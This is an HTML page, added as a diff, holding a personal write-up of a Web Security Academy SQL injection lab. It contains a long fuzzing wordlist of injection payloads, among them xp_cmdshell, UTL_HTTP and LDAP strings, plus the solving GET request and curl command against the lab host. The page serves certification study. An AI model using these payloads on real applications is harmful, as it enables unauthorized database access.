@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>BSCP certification exercises | Personal solution for all certification labs</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="BSCP certification exercises" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Personal solution for all certification labs" />
+<meta property="og:description" content="Personal solution for all certification labs" />
+<link rel="canonical" href="http://localhost:4000/sql-injection/sql1.html" />
+<meta property="og:url" content="http://localhost:4000/sql-injection/sql1.html" />
+<meta property="og:site_name" content="BSCP certification exercises" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="BSCP certification exercises" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Personal solution for all certification labs","headline":"BSCP certification exercises","url":"http://localhost:4000/sql-injection/sql1.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BSCP certification exercises</h1>
+        </a>
+        <h2>Personal solution for all certification labs</h2>
+
+        <section id="downloads">
+          
+            <a href="" class="btn">Download as .zip</a>
+            <a href="" class="btn">Download as .tar.gz</a>
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="sql-injection">SQL Injection</h2>
+
+<h3 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h3>
+
+<p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+</code></pre></div></div>
+
+<p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>
+
+<p><img src="../assets/images/sql1_intruder.png" alt="SQLI 1 intruder" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wordlists/wfuzz/Injections/SQL.txt 
+'
+"
+#
+-
+--
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+&lt;&gt;"'%;)(&amp;+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&amp;lt;&amp;gt;&amp;quot;'%;)(&amp;amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&amp;apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&amp;
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+
+</code></pre></div></div>
+
+<p><img src="../assets/images/sql1_solution.png" alt="SQLI 1 solution" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /filter?category<span class="o">=</span><span class="s1">'%20or%20'</span>1<span class="s1">'%3d'</span>1<span class="s1">'--&amp;released=1 HTTP/2
+Host: 0af2009a0429088480dd269a0051000c.web-security-academy.net
+Cookie: session=Z5YS67o84FgYjV1moTElybtQCZvccgXQ
+Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: es-ES,es;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0af2009a0429088480dd269a0051000c.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+</span></code></pre></div></div>
+
+<p>curl command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--path-as-is</span> <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s1">$'GET'</span> <span class="se">\</span>
+    <span class="nt">-H</span> <span class="s1">$'Host: 0af2009a0429088480dd269a0051000c.web-security-academy.net'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua: </span><span class="se">\"</span><span class="s1">Chromium</span><span class="se">\"</span><span class="s1">;v=</span><span class="se">\"</span><span class="s1">135</span><span class="se">\"</span><span class="s1">, </span><span class="se">\"</span><span class="s1">Not-A.Brand</span><span class="se">\"</span><span class="s1">;v=</span><span class="se">\"</span><span class="s1">8</span><span class="se">\"</span><span class="s1">'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua-Mobile: ?0'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua-Platform: </span><span class="se">\"</span><span class="s1">Linux</span><span class="se">\"</span><span class="s1">'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Language: es-ES,es;q=0.9'</span> <span class="nt">-H</span> <span class="s1">$'Upgrade-Insecure-Requests: 1'</span> <span class="nt">-H</span> <span class="s1">$'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span> <span class="nt">-H</span> <span class="s1">$'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Site: same-origin'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Mode: navigate'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-User: ?1'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Dest: document'</span> <span class="nt">-H</span> <span class="s1">$'Referer: https://0af2009a0429088480dd269a0051000c.web-security-academy.net/'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Encoding: gzip, deflate, br'</span> <span class="nt">-H</span> <span class="s1">$'Priority: u=0, i'</span> <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s1">$'session=Z5YS67o84FgYjV1moTElybtQCZvccgXQ'</span> <span class="se">\</span>
+    <span class="s1">$'https://0af2009a0429088480dd269a0051000c.web-security-academy.net/filter?category=</span><span class="se">\'</span><span class="s1">%20or%20</span><span class="se">\'</span><span class="s1">1</span><span class="se">\'</span><span class="s1">%3d</span><span class="se">\'</span><span class="s1">1</span><span class="se">\'</span><span class="s1">--&amp;released=1'</span>
+</code></pre></div></div>
+
+<hr />
+<p><a href="../index.html">Index</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
